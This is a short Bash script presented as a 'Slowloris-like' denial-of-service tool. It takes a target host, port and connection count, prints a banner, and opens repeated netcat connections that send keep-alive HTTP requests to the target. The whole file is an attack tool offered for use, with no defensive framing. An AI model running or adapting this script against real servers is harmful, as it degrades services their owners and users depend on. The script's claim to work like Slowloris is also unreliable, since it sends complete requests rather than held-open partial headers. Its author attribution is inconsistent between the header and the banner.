#!/bin/bash

# Slowloris-like tool in Bash
# Developed by Shreyash Kothe

# Function to display usage
usage() {
    echo "Usage: $0 <target> <port> <num_connections>"
    echo "Example: $0 example.com 80 200"
    exit 1
}

# Check for required arguments
if [ "$#" -ne 3 ]; then
    usage
fi

TARGET=$1
PORT=$2
NUM_CONNECTIONS=$3

# Display banner
echo "----------------------------------------"
echo "        


:::       ::: ::::::::::: ::::::::: :::::::::: :::::::::
:+:       :+:     :+:          :+:  :+:        :+:    :+:
+:+       +:+     +:+         +:+   +:+        +:+    +:+
+#+  +:+  +#+     +#+        +#+    +#++:++#   +#++:++#:
+#+ +#+#+ +#+     +#+       +#+     +#+        +#+    +#+
 #+#+# #+#+#      #+#      #+#      #+#        #+#    #+#
  ###   ###   ########### ######### ########## ###    ###


                  "
echo "         Developed by Shreyash Kolhe    "
echo "----------------------------------------"

# Loop to create connections
for ((i=1; i<=$NUM_CONNECTIONS; i++)); do
    # Open a connection and keep it alive
    ( echo -ne "GET / HTTP/1.1\r\nHost: $TARGET\r\nConnection: keep-alive\r\n\r\n" | nc $TARGET $PORT ) &
    echo "Connection $i opened to $TARGET:$PORT"
    sleep 1 # Delay to avoid overwhelming
done

wait
echo "Finished opening $NUM_CONNECTIONS connections to $TARGET:$PORT"
